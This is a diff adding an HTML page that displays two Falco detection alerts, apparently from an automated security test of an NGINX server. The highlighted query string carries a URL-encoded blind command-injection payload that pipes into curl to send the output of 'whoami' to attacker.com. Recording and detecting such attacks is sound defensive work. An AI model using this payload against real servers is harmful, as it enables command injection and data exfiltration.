@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: auto;
+            min-height: 600px;
+            overflow: auto;
+        }
+        body {
+            font-family: monospace;
+            padding: 15px;
+            background-color: #1a1a1a;
+            color: #e0e0e0;
+            line-height: 1.5;
+        }
+        pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            margin: 0;
+            overflow: visible;
+        }
+        .content {
+            overflow: visible;
+        }
+        mark {
+            background-color: #FFFF00;
+            color: #000;
+            padding: 1px 3px;
+            border-radius: 2px;
+        }
+        h3 {
+            color: #4CAF50;
+            margin: 0 0 15px 0;
+        }
+    </style>
+</head>
+<body>
+<h3>falco.log (Detected)</h3>
+<pre>11:54:53.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_003-1772193293587-76v4ts pattern_id=CMD_BLIND_003 uri=/?q=<mark style="background-color: #FFFF00; padding: 1px 3px;">%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60</mark> client=127.0.0.1
+11:54:53.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_003-1772193293587-76v4ts pattern_id=CMD_BLIND_003 uri=/?q=<mark style="background-color: #FFFF00; padding: 1px 3px;">%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60</mark> client=127.0.0.1</pre>
+</body>
+</html>
